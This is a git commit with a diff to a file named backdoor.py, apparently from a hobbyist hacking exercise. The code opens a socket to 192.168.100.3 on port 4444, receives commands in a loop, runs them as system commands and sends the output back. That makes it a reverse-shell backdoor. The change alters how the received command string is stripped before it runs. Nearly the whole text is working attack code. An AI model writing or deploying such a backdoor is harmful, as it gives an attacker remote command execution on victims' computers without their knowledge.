8ca7c691d2dc808ddb6a7ac093f38bb02e18f823
Sergey Nazemtsev <42sdn@mail.ru>
2021-08-12 13:14:42 +0700

    Connection with remote computer + executing commands

--- backdoor.py
+++ backdoor.py
@@ -12,7 +12,11 @@ connection.connect(("192.168.100.3", 4444))
 
 while True:
     command = connection.recv(1024)
-    command_result = execute_system_command(command)
+    c = str(command)
+    a = c.replace(c[0], "")
+    s = a.replace(a[0], "")
+    # print(s)
+    command_result = execute_system_command(str(s))
     connection.send(command_result)
 
 connection.close()
